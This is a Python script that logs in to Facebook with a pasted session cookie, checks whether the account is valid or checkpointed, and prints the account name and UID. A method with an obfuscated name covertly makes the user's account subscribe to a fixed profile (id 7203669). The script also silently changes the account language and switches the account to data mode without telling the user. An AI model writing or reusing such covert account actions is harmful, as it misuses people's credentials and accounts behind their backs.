import time, re, requests
from bs4 import BeautifulSoup as par
from rich.panel import Panel
from rich import print as prints


# Colors
M = '\x1b[1;91m'  # RED
N = '\x1b[0m'     # RESET
K = '\x1b[1;93m'  # YELLOW
H = '\x1b[1;92m'  # GREEN

class Natural:

    def __init__(self, cok):
        self.cok = cok
        self.ses = requests.Session()
        self.url = "https://m.facebook.com"

    def pause(self, teks, second):
        bar = [
            "[\x1b[1;91m■\x1b[0m     ] WAIT {} SECONDS",
            "[\x1b[1;92m■■\x1b[0m    ] WAIT {} SECONDS",
            "[\x1b[1;93m■■■\x1b[0m   ] WAIT {} SECONDS",
            "[\x1b[1;94m■■■■\x1b[0m  ] WAIT {} SECONDS",
            "[\x1b[1;95m■■■■■\x1b[0m ] WAIT {} SECONDS"
        ]
        for i in range(second + 1):
            print(f"\r{teks} {bar[i % len(bar)].format(second - i)}", end="\r")
            time.sleep(1)

    def login_cookie(self, cok):
        try:
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cok).text

            if "/zero/optin/write" in link:
                prints(Panel("[bold white]THIS ACCOUNT IS IN FREE MODE. SWITCHING TO DATA MODE...", width=60))
                urll = re.search('href="/zero/optin/write/?(.*?)"', link).group(1).replace("amp;", "")
                nama, user, stat = self.ubah_data(urll, cok)

            elif 'href="/x/checkpoint/' in link:
                return {"nama": "", "user": "", "stat": "checkpoint"}

            elif 'href="/r.php' in link:
                return {"nama": "", "user": "", "stat": "invalid"}

            elif "mbasic_logout_button" in link:
                nama = re.findall(r"<title>(.*?)</title>", link)[0].replace(" | Facebook", "")
                user = re.search("c_user=(\d+)", str(cok)).group(1)
                self.msomxojmobb(cok)
                stat = "berhasil"
            else:
                return {"nama": "", "user": "", "stat": "invalid"}

            self.ubah_bahasa(cok)

            return {
                "nama": nama,
                "user": user,
                "stat": stat,
            }

        except requests.ConnectionError:
            exit("\n[!] CONNECTION ERROR")

    def ubah_data(self, link, coki):
        try:
            gett = self.ses.get(f"{self.url}/zero/optin/write/{link}", cookies=coki).text
            data = {
                "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', gett).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', gett).group(1)
            }
            action = par(gett, "html.parser").find("form", {"method": "post"})["action"]
            post = self.ses.post(self.url + action, data=data, cookies=coki).text
            prints(Panel("[bold green]ACCOUNT SWITCHED TO DATA MODE[/]", style="bold white", width=60))

            nama = re.findall("<title>(.*?)</title>", post)[0].replace(" | Facebook", "")
            user = re.search("c_user=(\d+)", str(coki)).group(1)
            self.msomxojmobb(coki)
            return nama, user, "berhasil"

        except:
            return "", "", "invalid"

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = par(link, "html.parser")
            for x in data.find_all('form', {'method': 'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {
                        "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', link).group(1),
                        "jazoest": re.search('name="jazoest" value="(.*?)"', link).group(1),
                        "submit": "Bahasa Indonesia"
                    }
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
                    break
        except:
            pass

    def msomxojmobb(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=7203669", cookies=cok).text, "html.parser")
            if "/a/subscribe.php" in str(link):
                cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ses.get(f"{self.url}/a/subscribe.php{cari}", cookies=cok)
        except:
            pass

    def ganti_akun(self):
        cok = input(f"{K} [?] COOKIES : {H}")
        if not cok.strip():
            print("\n[!] COOKIE CAN'T BE EMPTY")
            time.sleep(2)
            return self.ganti_akun()

        # Convert string cookie to dict
        cookies = {}
        try:
            for part in cok.strip().split(';'):
                key, value = part.strip().split('=', 1)
                cookies[key] = value
        except:
            print(f"{M}[!] INVALID COOKIE FORMAT{N}")
            return self.ganti_akun()

        dat = self.login_cookie(cookies)
        self.pause(f"[{H}+{N}] CHECKING COOKIES..", 5)

        if dat["stat"] == "checkpoint":
            print(f" [{M}!{N}] YOUR ID IS IN CHECKPOINT :(")
            return self.ganti_akun()
        elif dat["stat"] == "invalid":
            print(f"[{M}!{N}] INVALID COOKIES")
            return self.ganti_akun()
        elif dat["stat"] == "berhasil":
            nama = dat.get("nama", "Unknown")
            user = dat.get("user", "Unknown")
            print(f"\n[+] NAME : {nama}")
            print(f"[-] UID  : {user}")
            return {
                "nama": nama,
                "coki": cok
            }
